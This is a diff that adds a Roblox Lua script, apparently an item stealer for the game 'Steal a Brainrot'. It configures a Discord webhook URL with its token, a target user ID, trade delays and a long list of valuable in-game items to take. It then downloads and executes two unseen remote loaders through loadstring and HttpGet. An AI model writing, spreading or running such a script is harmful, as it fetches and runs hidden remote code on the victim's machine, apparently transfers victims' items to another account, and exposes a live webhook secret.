@@ -1,0 +1,98 @@
+-- 5 second initial delay
+task.wait(5)
+
+getgenv().WEBHOOK_URL = "https://discordapp.com/api/webhooks/1480087665717022760/dcXGiNxughhrgPI4ikqO8EwxDvrdLwBSqQtWpE2mTdakvCUb8s7-fISzRKExEygEUTUB"
+getgenv().TARGET_ID = 2298544377
+getgenv().DELAY_STEP = 1
+getgenv().TRADE_CYCLE_DELAY = 2
+
+getgenv().TARGET_BRAINROTS = {
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Quesadillo Vampiro"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["La Extinct Grande"] = true,
+    ["La Spooky Grande"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Tuff Toucan"] = true,
+    ["W or L"] = true,
+    ["La Jolly Grande"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Swaggy Bros"] = true,
+    ["Festive 67"] = true,
+    ["La Romantic Grande"] = true,
+    ["Los Tralaleritos"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Money Money Puggy"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Tictac Sahur"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Garama and Madundung"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Agarrini la Palini"] = true,
+    ["Guest 666"] = true,
+    ["Brunito Marsito"] = true,
+    ["Mariachi Corazoni"] = true,
+    ["Swag Soda"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Bros"] = true,
+    ["Tralaledon"] = true,
+    ["Los Puggies"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Primos"] = true,
+    ["Los Spaghettis"] = true,
+    ["Ginger Gerat"] = true,
+    ["Love Love Bear"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Casa Boo"] = true,
+    ["Los Sekolahs"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Ketupat Bros"] = true,
+    ["Cooki and Milki"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Mieteteira Bicicleteira"] = true,
+    ["La Grande Combinasion"] = true,
+    ["25"] = true,
+    ["Chill Puppy"] = true,
+    ["Los Sweethearts"] = true,
+    ["Spinny Hammy"] = true,
+    ["Las Sis"] = true,
+    ["Los Planitos"] = true,
+    ["Los Mobilis"] = true,
+    ["Los Candies"] = true,
+    ["Bacuru and Egguru"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Eviledon"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Orcaledon"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Chicleteira Noelteira"] = true,
+    ["Bisonte Giuppitere"] = true,
+    ["Los 25"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Los Nooo My Hotspotsitos"] = true,
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+end)
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0fbe1cfb1005a43bbfeb46cd458b7f09.lua"))()
+end)
